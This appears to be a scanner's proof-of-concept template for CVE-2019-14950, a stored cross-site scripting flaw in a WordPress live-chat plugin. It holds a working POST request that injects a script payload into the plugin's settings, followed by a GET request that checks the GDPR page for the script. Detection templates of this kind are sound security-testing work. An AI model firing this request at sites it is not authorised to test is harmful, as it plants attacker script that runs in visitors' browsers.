[info]
author = "ave"
description = "WordPress wp-live-chat-support插件8.0.27版本之前存在存储型跨站脚本漏洞，攻击者可通过GDPR页面注入恶意JavaScript代码"
id = "POC-AVE-2019-0083"
name = "CVE-2019-14950 PoC"
severity = "medium"
tags = ["ave-2019-0083"]
vuln_id = [
    "CVE-2019-14950",
    "AVE-2019-0083",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/wp-admin/admin-post.php"
protocol = "http"

[poc.requests.body]
content = "wplc_settings_enabled=1&wplc_require_user_info=1&wplc_user_default_visitor_name=Guest&wplc_user_alternative_text=Please+click+%27Start+Chat%27+to+initiate+a+chat+with+an+agent&wplc_loggedin_user_info=1&wplc_enabled_on_mobile=1&wplc_enable_msg_sound=1&wplc_enable_font_awesome=1&wplc_elem_trigger_action=0&wplc_elem_trigger_type=0&wplc_elem_trigger_id=&wplc_environment=1&wplc_iterations=55&wplc_delay_between_loops=500000&wplc_enable_transcripts=1&wplc_send_transcripts_to=user&wplc_et_email_body=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
type = "form"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests]]
method = "GET"
path = "/wp-content/plugins/wp-live-chat-support/includes/gdpr.php"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["<script>alert(document.domain)</script>"]
